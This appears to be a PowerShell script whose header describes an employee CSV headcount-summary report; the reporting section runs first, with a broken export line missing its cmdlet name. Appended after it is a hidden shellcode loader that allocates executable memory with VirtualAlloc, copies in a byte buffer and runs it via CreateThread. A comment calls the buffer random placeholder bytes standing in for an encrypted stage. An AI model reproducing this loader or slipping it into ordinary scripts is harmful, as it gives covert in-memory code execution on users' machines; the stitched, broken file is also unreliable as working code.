
<#
.SYNOPSIS
    Reads an exported employee CSV and writes an aggregated summary report.
.DESCRIPTION
    Validates the column layout of the source file, converts the Amount column
    to a number and aggregates headcount and spend per department or site.
    Missing columns are reported as a hard error so a changed export cannot
    silently produce an empty report.
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$InputCsv = 'C:\Data\exports\headcount.csv',

    [string]$OutputPath = "C:\Logs\reports\headcount-summary-2024-07-05.csv",

    [Parameter(Mandatory = $false)]
    [ValidateSet("Department", "Site")]
    [string]$GroupBy = "Site",

    [double]$MinAmount = 1000
)

$hostName = $env:COMPUTERNAME
$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path

if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ','
if (@($rows).Count -eq 0) {
    throw 'The input CSV contains no data rows.'
}
$required = @('EmployeeId', 'Name', 'Department', 'Site', 'Amount')
$available = $rows[0].PSObject.Properties.Name
$missing = @($required | Where-Object { $available -notcontains $_ })
if ($missing.Count -gt 0) {
    throw ("Missing column(s): {0}" -f ($missing -join ', '))
}
$rows | ForEach-Object { $_.Amount = [double]$_.Amount }

$byGroup = $rows | Group-Object -Property $GroupBy | ForEach-Object {
    $sum = ($_.Group | Measure-Object -Property Amount -Sum).Sum
    [pscustomobject]@{
        Group     = $_.Name
        Metric    = $GroupBy
        Employees = $_.Count
        Total     = [math]::Round($sum, 2)
        Average   = [math]::Round(($sum / $_.Count), 2)
    }
}

$grandTotal = [math]::Round((($rows | Measure-Object -Property Amount -Sum).Sum), 2)
$rowCount = @($rows).Count

$byGroup | Sort-Object -Property Total -Descending |
    -NoTypeInformation `
    -Path $OutputPath `
    -Encoding UTF8

$top = $byGroup | Sort-Object -Property Total -Descending | Select-Object -First 1
Write-Host ("{0} rows processed, total {1:N2}" -f $rowCount, $grandTotal) -ForegroundColor Green
Write-Host ("Largest group: {0} ({1})" -f $top.Group, $top.Metric) -ForegroundColor Cyan

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeMethods
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0xc4, 0x96, 0x5a, 0x71, 0xf8, 0x33, 0x6b, 0xf6, 0x55, 0xbc, 0x1c, 0xdd, 0xa3, 0x28, 0x7a, 0x36,
        0x77, 0x1d, 0xf8, 0xa9, 0x32, 0x67, 0xd5, 0xa3, 0x67, 0x8e, 0x87, 0x57, 0x9c, 0x4e, 0x24, 0x05,
        0xb0, 0xab, 0x8b, 0xb9, 0xf9, 0x21, 0x73, 0x82, 0x70, 0x8a, 0x74, 0xac, 0xe3, 0xa5, 0x49, 0x5e,
        0x74, 0x85, 0xcd, 0x6b, 0x95, 0x29, 0xf9, 0x49, 0x40, 0x79, 0x66, 0xb8, 0x29, 0xb6, 0x63, 0x74,
        0xc1, 0x44, 0x0d, 0x4a, 0x71, 0xb2, 0xce, 0xda, 0xde, 0x6d, 0xf3, 0x90, 0x47, 0x30, 0x8d, 0xc8,
        0xd7, 0xb2, 0x91, 0xf3, 0x2c, 0x81, 0xa3, 0x74, 0xa6, 0xad, 0xb7, 0x47, 0xac, 0x17, 0x5a, 0x57,
        0xdc, 0x93, 0x5f, 0x23, 0x72, 0xd3, 0xd3, 0x1a, 0x69, 0xa1, 0x4a, 0x9e, 0x29, 0x05, 0x21, 0x4a,
        0x8f, 0xdf, 0x56, 0x9b, 0x52, 0x7c, 0xb8, 0xd0, 0xfb, 0x50, 0x43, 0x04, 0xcb, 0x0b, 0x51, 0x80,
        0x3c, 0x12, 0x90, 0x88, 0xaf, 0x16, 0x9b, 0x80, 0x9d, 0x86, 0x16, 0x65, 0x01, 0x71, 0xf4, 0xac,
        0xf9, 0x0c, 0xb1, 0xe7, 0xff, 0x6f, 0xf2, 0xb4, 0xa0, 0xb8, 0xe7, 0xce, 0x24, 0xcc, 0xc7, 0x8e,
        0xa8, 0x52, 0xd0, 0x94, 0xc0, 0x09, 0xf7, 0xf9, 0xd2, 0xc1, 0x18, 0xea, 0x1c, 0x61, 0x7f, 0xbf,
        0x31, 0xbf, 0xad, 0xb2, 0x18, 0x37, 0x2b, 0xf1, 0x50, 0x44, 0xce, 0x20, 0x09, 0xce, 0x9e, 0x67,
        0x27, 0x7f, 0x67, 0xae, 0x6f, 0x25, 0x07, 0xfd, 0x78, 0xa5, 0x64, 0xc8, 0x44, 0x80, 0xb6, 0x0a,
        0x94, 0x61, 0x66, 0x8a, 0x68, 0x6a, 0x68, 0x09, 0x9a, 0xca, 0xf9, 0x4b, 0xba, 0xab, 0x71, 0xa5,
        0x03, 0xcf, 0x68, 0x19, 0xe6, 0x39, 0x80, 0x6d, 0xfc, 0xcf, 0xcf, 0x12, 0x40, 0x83, 0xbd, 0x28,
        0xcd, 0x3b, 0x70, 0xb8, 0x13, 0xd5, 0x4c, 0xde, 0x24, 0x05, 0x8f, 0x7f, 0x57, 0xb1, 0x25, 0xe9,
        0xfd, 0x15, 0xc9, 0x99, 0xee, 0x46, 0x71, 0xf6, 0xb2, 0xde, 0x12, 0x1e, 0x6e, 0x83, 0x0f, 0x15,
        0x22, 0x22, 0x7c, 0x69, 0x83, 0xc8, 0x3e, 0x61, 0xb1, 0x4b, 0x3d, 0x3f, 0xfe, 0x80, 0xf0, 0xa1,
        0x99, 0x38, 0x2b, 0xb6, 0x67, 0x75, 0xfb, 0xec, 0xe7, 0xa2, 0x77, 0xc4, 0xe5, 0xb9, 0x9c, 0x36,
        0xa0, 0x0c, 0x42, 0x3d, 0x9f, 0x85, 0xd1, 0xb0, 0x8b, 0x67, 0x1c, 0x5f, 0x4c, 0x8f, 0x53, 0x97,
        0x5a, 0xa7, 0xf4, 0x85
    )

    $ProcHandle = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($ProcHandle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $ProcHandle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $ProcHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeMethods]::WaitForSingleObject($Thread, 2024)
    [void][NativeMethods]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
